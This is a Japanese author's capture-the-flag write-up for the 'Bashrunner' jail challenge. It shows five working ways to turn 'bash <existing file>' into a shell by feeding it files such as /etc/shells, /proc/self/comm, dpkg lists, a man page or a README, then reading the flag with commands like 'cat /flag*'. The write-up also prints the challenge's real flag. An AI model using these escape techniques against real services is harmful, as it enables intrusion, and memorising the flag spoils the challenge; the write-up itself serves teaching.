# Author's Writeup for Bashrunner

Daily AlpacaHack で 1/23 に出題した『Bashrunner』の作問者 Writeup です。

https://alpacahack.com/daily/challenges/bash-runner

**目次**
- [問題概要](#問題概要)
- [考察](#考察)
  - [`os.path.isfile` のチェックをバイパスするのは無理そう](#ospathisfile-のチェックをバイパスするのは無理そう)
  - [色んなシェルスクリプトがありそう](#色んなシェルスクリプトがありそう)
  - [シェルスクリプトでなくてもテキストファイルであれば大丈夫そう](#シェルスクリプトでなくてもテキストファイルであれば大丈夫そう)
- [解法](#解法)
  - [解法1: `/etc/shells`, `/usr/share/debianutils/shells*`, `/var/lib/shells.state`](#解法1-etcshells-usrsharedebianutilsshells-varlibshellsstate)
  - [解法2: `/proc/self/comm`](#解法2-procselfcomm)
  - [解法3: `/var/lib/dpkg/info/*.list`](#解法3-varlibdpkginfolist)
  - [解法4: `/usr/local/share/man/man1/python3.*`](#解法4-usrlocalsharemanman1python3)
  - [解法5: `/usr/share/doc/hicolor-icon-theme/README.md`](#解法5-usrsharedochicolor-icon-themereadmemd)
- [おわりに](#おわりに)

## 問題概要

問題文:
```
"You called it a jail camp. To me, this city's a whole lot worse."
```

添付ファイルには次の Python スクリプトが含まれており、これがサーバーで実行されています:
```python
import os

path = input("Example: hello.sh\n$ bash ")
if os.path.isfile(path):
    os.system(f"bash {path}")
else:
    print("File not found")
```

パスの入力が求められて、それがファイルであれば `bash <パス>` が実行されるようです。

実行できるシェルスクリプトの例として、 `hello.sh` も与えられています:
```sh
echo "Welcome to Jail City"
```

試しにサーバーに接続して、存在するシェルスクリプト と 存在しないシェルスクリプト をそれぞれ入力してみると結果は次のようになります:
```
$ nc localhost 1337
Example: hello.sh
$ bash hello.sh
Welcome to Jail City

$ nc localhost 1337
Example: hello.sh
$ bash world.sh
File not found
```

また、与えられた Dockerfile から、イメージは `python:3.14.2` をベースに構築されており、フラグは `/flag-(md5hash).txt` に配置されていることがわかります。

## 考察

### `os.path.isfile` のチェックをバイパスするのは無理そう

`os.path.isfile` が `True` を満たすように、以下の処理ができるでしょうか。
1. `bash -オプション` のようなコマンドを実行してインタラクティブシェルを起動する
2. `bash /flag*`  のようなコマンドを実行して、フラグがシェルスクリプトとして実行されたときのエラーメッセージからフラグを得る（フラグに空白が含まれていないときに限る）
3. `bash $(コマンド)` のようなコマンドを実行して、任意コード実行する

実際に試しても Python と Bash の仕様を確認しても、この方向性では解くのは難しいことがわかります。

つまり、この問題のゴールは **「Bash で任意ファイルを実行できるとき、任意コード実行に発展させる」** ことになりそうです。

### 色んなシェルスクリプトがありそう

Linux システム上には多数のシェルスクリプトが存在するため、そのいずれかを実行することで任意コード実行に繋げられないかと考えられます。

例えば、 `which` コマンドの実態はシェルスクリプトです:

```
file /usr/bin/which.debianutils
/usr/bin/which.debianutils: POSIX shell script, ASCII text executable
```

実際 `/usr/bin/` を見ると大量のシェルスクリプトがあります:
```
file /usr/bin/* | grep shell | wc -l
62
```

### シェルスクリプトでなくてもテキストファイルであれば大丈夫そう

ここで一度視点を変え、ゴールから逆算して考えてみます。

`bash <ファイルパス>` で任意コード実行が起こる条件は、どのようなファイルを与えているときでしょうか。

必ずしも「正しいシェルスクリプト」である必要はありません。テキストファイルでも大丈夫のはずです。

Bash は基本的に行単位でコマンドを解釈します。
そして、`set -e` が指定されていなければ、ある行のコマンドが失敗しても次の行のコマンドの実行に進みます。

例えば、

```sh
echohello
echo hello
```

というシェルスクリプトを実行したら、

```
$ bash tmp.sh 
tmp.sh: line 1: echohello: command not found
hello
```

という結果になり、2行目の `echo hello` が実行されています。

そのため、テキストファイルの中に 1 行でも有効なコマンドがあれば問題を解くのに一歩近づきます。

例えば、`sh`, `bash`, `python` などと書かれたファイルがあれば、それらコマンドが実行され任意コード実行に繋がります。

では、そのようなファイルは存在するのでしょうか？

## 解法

解法は大きく 5 種類あります。
簡単な順に紹介します。

### 解法1: `/etc/shells`, `/usr/share/debianutils/shells*`, `/var/lib/shells.state`

Linux はシェルに関する情報が記載されたファイルをいくつか持ちます。

代表的なものが `/etc/shells` で、ログインシェルとして許可されたシェルの一覧です。

`/etc/shells` は単なるテキストファイルで、1 行につき 1 つのシェルのパスが書かれています。
この Docker イメージでは `/etc/shells` の中身は次のようになっています:

```
$ cat /etc/shells
# /etc/shells: valid login shells
/bin/sh
/usr/bin/sh
/bin/bash
/usr/bin/bash
/bin/rbash
/usr/bin/rbash
/usr/bin/dash
```

`bash <ファイルパス>` は各行をコマンドとして実行するため、 `/etc/shells` を与えた場合、 `/bin/sh` が実行されてシェルが起動します。
あとはそのシェル内でコマンドを打てるので、フラグを取得できます:

```
Example: hello.sh
$ bash /etc/shells
cat /flag*
Alpaca{*** REDACTED ***}
```

同様に `/usr/share/debianutils/shells`, `/usr/share/debianutils/shells.d/*`, `/var/lib/shells.state` も行ごとにシェルのパスが書かれているので、`bash` に与えればシェルが起動します:
```
$ cat /usr/share/debianutils/shells
# /etc/shells: valid login shells
/bin/sh

$ cat /usr/share/debianutils/shells.d/bash 
/bin/bash
/bin/rbash
/usr/bin/bash
/usr/bin/rbash

$ cat /usr/share/debianutils/shells.d/dash
/usr/bin/dash

$ cat /var/lib/shells.state
/bin/sh
/usr/bin/sh
/bin/bash
/usr/bin/bash
/bin/rbash
/usr/bin/rbash
/usr/bin/dash
```

### 解法2: `/proc/self/comm`

Unix 系 OS には、 procfs (proc filesystem) という特殊なファイルシステムが存在しています。

カーネル内部が保持するプロセスのデータを取得できる様々な特殊なファイルが `/proc` の下に存在しています。

例えば、 `/proc/self/environ` は環境変数にアクセスできます:

```
$ cat /proc/self/environ
PYTHON_SHA256=ce543ab854bc256b61b71e9b27f831ffd1bfd60a479d639f8be7f9757cf573e9HOSTNAME=63cdcfded79bSOCAT_PEERADDR=192.168.65.1PYTHON_VERSION=3.14.2PWD=/appSOCAT_PEERPORT=20062HOME=/nonexistentSHLVL=2SOCAT_PPID=1SOCAT_SOCKADDR=192.168.160.2SOCAT_SOCKPORT=1337SOCAT_PID=43LC_CTYPE=C.UTF-8PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binSOCAT_VERSION=1.8.0.3_=/usr/bin/cat
```

去年の 12/16 に出題された[🐈️](https://alpacahack.com/daily/challenges/cat?month=2025-12) でも、解法の1つに `/proc/self/fd/0` を使うものがあります。

procfs は本当に面白く、色々な情報を取得できるファイルがあり、無限の脆弱性を生み出します。

そんな procfs ですが、実はこの問題を解くのに使えるファイルが存在します。
`/proc/self/comm` です。

`/proc/self/comm` は、プロセスのコマンド名を取得できるファイルです。

例えば、 `cat /proc/self/comm` を実行すると、プロセスのコマンド名は `cat` なので次のような結果になります:

```
$ cat /proc/self/comm
cat
```

では、ここで `bash /proc/self/comm` を実行したときはどうなるでしょうか。
`/proc/self/comm` は次の内容になります:
```
bash
```

つまり、 **`/proc/self/comm` は `bash` に読み取られているとき、その瞬間、単に `bash` を実行するシェルスクリプトと解釈できるようになっているわけです** 。

結果として `bash` が `bash` 自身を実行し、新しくシェルが起動します。
したがって、以下のようにフラグを取得できます:

```
Example: hello.sh
$ bash /proc/self/comm
cat /flag*
Alpaca{*** REDACTED ***}
```

### 解法3: `/var/lib/dpkg/info/*.list`

Debian 系 OS では、インストール済みパッケージのファイル一覧が `/var/lib/dpkg/info/*.list` に保存されています。

中身はパスの羅列なので、`bash` に読ませるとそのパスをコマンドとして実行しようとします。

ところどころエラーになりますが、そのまま次の行へ進むため、途中に任意コード実行などに繋げられる有用な実行可能ファイルのパスが含まれていれば勝ちです。

例えば `perl-base.list` には`/usr/bin/perl` が含まれています:

```
$ head /var/lib/dpkg/info/perl-base.list
/.
/usr
/usr/bin
/usr/bin/perl
/usr/bin/perl5.40.1
/usr/lib
/usr/lib/aarch64-linux-gnu
/usr/lib/aarch64-linux-gnu/perl-base
/usr/lib/aarch64-linux-gnu/perl-base/AutoLoader.pm
/usr/lib/aarch64-linux-gnu/perl-base/Carp
```

これにより `perl-base.list` を実行すれば標準入力から Perl スクリプトを実行できるようになるので、`system("cat /flag*")` を入力し、 `Ctrl + D` で EOF を送ればフラグが取得できます:

```
Example: hello.sh
$ bash /var/lib/dpkg/info/perl-base.list
/var/lib/dpkg/info/perl-base.list: line 2: /usr: Is a directory
/var/lib/dpkg/info/perl-base.list: line 3: /usr/bin: Is a directory
system("cat /flag*");
Alpaca{*** REDACTED ***}
(省略)
```

他にも色々なコマンドを利用した色々な解法があると思います。
ちなみに、Bash や Dash も含まれており、これらを使っても解けます:
```
ls /var/lib/dpkg/info/*.list | grep sh.list
/var/lib/dpkg/info/bash.list
/var/lib/dpkg/info/dash.list
```

### 解法4: `/usr/local/share/man/man1/python3.*`

この Docker イメージは python コマンドに対応する man ページ（マニュアルページ）ファイルを持ちます:

```
$ ls /usr/local/share/man/man1/
python3.1
python3.14.1
```

`man` コマンドはインストールされていませんが、 python のイメージなのでどうやら  python の `man` ページファイルだけはインストールされてあるようです。

中身を `head` で確認すると次のようになっています:

```
$ head /usr/local/share/man/man1/python3.14.1
.TH PYTHON "1"

.\" To view this file while editing, run it through groff:
.\"   groff -Tascii -man python.man | less

.SH NAME
python \- an interpreted, interactive, object-oriented programming language
.SH SYNOPSIS
.B python
```

マニュアルはただのテキストなので、`bash` が読むと 1 行を 1 コマンドとして解釈します。

ここで NAME セクションには次の文字列が指定されています:
```
python \- an interpreted, interactive, object-oriented programming language
```

単なる python の見出しの文字列ですが、これをもし Bash で実行した場合どうなるでしょうか。

Bash では `\-` は「エスケープされた `-`」として解釈され、結果的にただの `-` になります。

`-` は `python` のオプションで、標準入力からスクリプトを受け取ることを意味します。

そのため、 `python \- an interpreted, interactive, object-oriented programming language` が実行されると Python が起動し、標準入力経由でスクリプトを与えて実行できる状態になります。

後ろの英単語は単なる引数と解釈されます:

```python
import sys
print(sys.argv)
# ['-', 'an', 'interpreted,', 'interactive,', 'object-oriented', 'programming', 'language']
```

あとは Python でフラグを読むだけです。次のスクリプトを入力すればOKです:

```python
import os
os.system("cat /flag*")
```

これを入力したあと `Ctrl + D` で EOF を送信すればフラグが出力されます:

```
$ nc localhost 1337
Example: hello.sh
$ bash /usr/local/share/man/man1/python3.14.1
/usr/local/share/man/man1/python3.14.1: line 1: .TH: command not found
/usr/local/share/man/man1/python3.14.1: line 3: .": command not found
/usr/local/share/man/man1/python3.14.1: line 4: .": command not found
/usr/local/share/man/man1/python3.14.1: line 4: less: command not found
/usr/local/share/man/man1/python3.14.1: line 6: .SH: command not found
import os
os.system("cat /flag*")
Alpaca{*** REDACTED ***}
```

### 解法5: `/usr/share/doc/hicolor-icon-theme/README.md`

ラストです。

`/usr/share/doc/hicolor-icon-theme/README.md` というファイルがあり、中身は次のようになっています。

````
$ cat /usr/share/doc/hicolor-icon-theme/README.md
Default Icon Theme
==================

This is the default fallback theme used by implementations of the icon
theme specification.

The specification is availible at:
http://www.freedesktop.org/standards/icon-theme-spec/

To install this package in /usr just run:
```bash
meson setup build --prefix /usr
meson install -C build
```

The canonical location for this package is:
https://gitlab.freedesktop.org/xdg/default-icon-theme

Tarballs are available at:
https://icon-theme.freedesktop.org/releases/

If you add translations, please send them to
xdg-list@freedesktop.org for inclusion in a later release.
````

`hicolor-icon-theme` ってなんですか？と思いますね。僕も知りません。

そんなことより、我々が今着目すべきなのはこのコードブロックです。
````
```bash
````

Bash ではバッククォート `` `...` `` がコマンド置換を表すため、
```` ```bash ```` は以下のように解釈されます:

- 1 個目と 2 個目の `` ` `` は空のコマンド置換（結果は空）
- 3 個目の `` ` `` から、次の `` ` ``（閉じ側の ```` ``` ````）までが1 つの巨大なコマンド置換

つまり、コードブロック全体が `` `...` `` の中身として実行されます。

その先頭には `bash` があるので、`bash` が起動して標準入力を待つ状態になります。

ここで好きなコマンドを打てるので、 `cat /flag*` でフラグを出力して `Ctrl + D` で EOF を送ると `bash` が終了し、そのフラグ文字列がそのままコマンドとして実行されます:

```
$ nc localhost 1337
Example: hello.sh
$ bash /usr/share/doc/hicolor-icon-theme/README.md
/usr/share/doc/hicolor-icon-theme/README.md: line 1: Default: command not found
/usr/share/doc/hicolor-icon-theme/README.md: line 2: ==================: command not found
/usr/share/doc/hicolor-icon-theme/README.md: line 4: This: command not found
/usr/share/doc/hicolor-icon-theme/README.md: line 5: theme: command not found
/usr/share/doc/hicolor-icon-theme/README.md: line 7: The: command not found
/usr/share/doc/hicolor-icon-theme/README.md: line 8: http://www.freedesktop.org/standards/icon-theme-spec/: No such file or directory
/usr/share/doc/hicolor-icon-theme/README.md: line 10: To: command not found
cat /flag*
/usr/share/doc/hicolor-icon-theme/README.md: line 15: meson: command not found
/usr/share/doc/hicolor-icon-theme/README.md: line 16: meson: command not found
/usr/share/doc/hicolor-icon-theme/README.md: line 14: Alpaca{***: command not found
/usr/share/doc/hicolor-icon-theme/README.md: line 16: The: command not found
/usr/share/doc/hicolor-icon-theme/README.md: line 17: https://gitlab.freedesktop.org/xdg/default-icon-theme: No such file or directory
/usr/share/doc/hicolor-icon-theme/README.md: line 19: Tarballs: command not found
/usr/share/doc/hicolor-icon-theme/README.md: line 20: https://icon-theme.freedesktop.org/releases/: No such file or directory
/usr/share/doc/hicolor-icon-theme/README.md: line 22: If: command not found
/usr/share/doc/hicolor-icon-theme/README.md: line 23: xdg-list@freedesktop.org: command not found
```

`line 14: Alpaca{***: command not found` というエラーが出てきました。

これはフラグに空白が含まれるためそこで文字列が区切られ、先頭の `Alpaca{***` がコマンド名として実行されたことを示しています。
空白以降のフラグは出力されておらず、工夫してフラグを出力する必要がありそうです。
実際、リモート環境のフラグにも空白が含まれています。

一つの解決策として、例えば、`cat /flag* >&2` で標準エラーに出力して回収できます:

```
$ nc localhost 1337
Example: hello.sh
$ bash /usr/share/doc/hicolor-icon-theme/README.md
/usr/share/doc/hicolor-icon-theme/README.md: line 1: Default: command not found
/usr/share/doc/hicolor-icon-theme/README.md: line 2: ==================: command not found
/usr/share/doc/hicolor-icon-theme/README.md: line 4: This: command not found
/usr/share/doc/hicolor-icon-theme/README.md: line 5: theme: command not found
/usr/share/doc/hicolor-icon-theme/README.md: line 7: The: command not found
/usr/share/doc/hicolor-icon-theme/README.md: line 8: http://www.freedesktop.org/standards/icon-theme-spec/: No such file or directory
/usr/share/doc/hicolor-icon-theme/README.md: line 10: To: command not found
cat /flag* >&2
Alpaca{*** REDACTED ***}
```

他には、空白を含まないように Base64 でエンコードしてもフラグを得られます:

```
$ nc localhost 1337
Example: hello.sh
$ bash /usr/share/doc/hicolor-icon-theme/README.md
/usr/share/doc/hicolor-icon-theme/README.md: line 1: Default: command not found
/usr/share/doc/hicolor-icon-theme/README.md: line 2: ==================: command not found
/usr/share/doc/hicolor-icon-theme/README.md: line 4: This: command not found
/usr/share/doc/hicolor-icon-theme/README.md: line 5: theme: command not found
/usr/share/doc/hicolor-icon-theme/README.md: line 7: The: command not found
/usr/share/doc/hicolor-icon-theme/README.md: line 8: http://www.freedesktop.org/standards/icon-theme-spec/: No such file or directory
/usr/share/doc/hicolor-icon-theme/README.md: line 10: To: command not found
cat /flag* | openssl base64
/usr/share/doc/hicolor-icon-theme/README.md: line 15: meson: command not found
/usr/share/doc/hicolor-icon-theme/README.md: line 16: meson: command not found
/usr/share/doc/hicolor-icon-theme/README.md: line 14: QWxwYWNheyoqKiBSRURBQ1RFRCAqKip9: command not found
/usr/share/doc/hicolor-icon-theme/README.md: line 16: The: command not found
/usr/share/doc/hicolor-icon-theme/README.md: line 17: https://gitlab.freedesktop.org/xdg/default-icon-theme: No such file or directory
/usr/share/doc/hicolor-icon-theme/README.md: line 19: Tarballs: command not found
/usr/share/doc/hicolor-icon-theme/README.md: line 20: https://icon-theme.freedesktop.org/releases/: No such file or directory
/usr/share/doc/hicolor-icon-theme/README.md: line 22: If: command not found
/usr/share/doc/hicolor-icon-theme/README.md: line 23: xdg-list@freedesktop.org: command not found
```

`line 14: QWxwYWNheyoqKiBSRURBQ1RFRCAqKip9: command not found` の出力があるので、これをデコードします:

```
$ echo "QWxwYWNheyoqKiBSRURBQ1RFRCAqKip9" | base64 -d
Alpaca{*** REDACTED ***}
```

## おわりに

「`bash /proc/self/comm` を実行したら `bash` を起動できるよね？」と気づいて作った問題でした。

任意ファイル読み込みできるときに、この問題のように意外なファイルを活用して想定外の挙動を達成できることがあります。
Linux のファイル構成を色々知るきっかけになっていれば嬉しいです。

Flag: `Alpaca{I Really Want to Stay At My House}`
